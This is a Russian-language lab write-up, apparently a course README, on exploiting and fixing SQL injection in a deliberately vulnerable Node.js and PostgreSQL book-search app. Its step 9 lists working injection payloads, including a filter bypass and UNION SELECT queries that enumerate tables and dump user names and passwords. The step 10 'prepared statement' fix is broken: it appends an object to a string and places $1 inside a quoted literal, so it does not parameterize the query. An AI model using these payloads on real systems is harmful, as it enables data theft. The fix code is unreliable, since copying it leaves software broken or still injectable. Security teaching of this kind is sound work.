# Лабораторная работа №2

Цель работы: Поиск и устранение SQL Injection.

## Задание 1

В папке lab2 находится nodejs уязвимое приложение. Необходимо развернуть его, найти SQL инъекцию и исправить. Модифицированное приложение загрузить в свой репозиторий GitHub.

Для выполнения лабораторной потребуется проделать следующие шаги:

1. Установить PostgreSQL сервер любой версии.
 
В качестве БД будем использовать docker-образ PostgreSQL. Запуск командой:

```bash
docker run --name postgres-lr -e POSTGRES_PASSWORD=passwddd -e POSTGRES_USER=postgres -e POSTGRES_DB=lib -d -p 5432:5432 postgres
```

2. Создать БД lib.

БД создается при запуске контейнера с помощью переменной окружения POSTGRES_DB=lib. 
 
3. Применить к ней скрипты из папки db (либо создать объекты и вставить данные в таблицы руками). Скрипты выполнять в порядке указанном в имени файла. Восстановить данные из файла data.sql.

Для входа в БД используется команда запуска шелла в контейнере, а затем, уже в контейнере, выполняется команда доступа к шеллу БД.

```bash
docker exec -it postgres-lr /bin/bash
psql -U postgres -d lib
```

<p align="center">
  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/3.1.png" />
</p>

<p align="center">
  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/3.2.png" />
</p>

<p align="center">
  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/3.3.png" />
</p>

4. Установить nodejs версии 14.

5. Перейти в папку lab2 и выполнить в ней команду:

```bash
npm install
```
<p align="center">
  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/5.png" />
</p>

6. Запустить сайт через Visual Studio Code или через команду:

```bash
npm start
```

<p align="center">
  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/6.png" />
</p>

7. Войти на сайт и увидеть список книг и авторов.
 
<p align="center">
  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/7.png" />
</p>
    
8. Обнаружить sql инъекцию.

Используем в качестве пейлоада одинарную кавычку и получаем ошибку и весь SQL запрос.

<p align="center">
  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/8.png" />
</p>

9. Написать отчёт с описанием найденной уязвимости и примерами её эксплуатации. В отчете приветси информацию об: обходе установленного фильтра, получении данных из другой таблицы, похищении пароля пользователя.

Получим текущую таблицу в обход SQL-запроса приложения. Используем пейлоад:

```sql
%' or 1 = 1 --
```

<p align="center">
  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/9.1.png" />
</p>

Получим схему БД для определения таблиц с помощью пейлоада:

```sql
%' union select null, table_schema, table_name from information_schema.tables --
```

<p align="center">
  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/9.2.png" />
</p>

Из вывода можно найти информацию от том, что есть таблица public.users. С помощью следующего запроса определим какие столбцы есть в БД и их тип:


```sql
%' union select null, column_name,data_type  from information_schema.columns  where table_name = 'users'; --
```

<p align="center">
  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/9.3.png" />
</p>

Посмотрим записи таблицы public.users с помощью запроса:

```sql
%' union select null, name, pass  from public.users; --
```

<p align="center">
  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/9.4.png" />
</p>
 
10. Исправить уязвимость. В отчёте привести пример того, что уязвимости больше не эксплуатируются.
 
Для исправления уязвимости используем prepared statements в запросе поиска по книге.

```javascript
if(bookname){
        sql+={
            text: `\rwhere b.name like '%$1%'`,
            values: [bookname]
        };
    }
```

<p align="center">
  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/10.png" />
</p>


P.S.
Помимо изученной SQLi обнаружена еще однин риск: хранение аутентификационных данных в коде программы.
Есть много способов получения аутентифкационных данных, одним из которых является PAM.
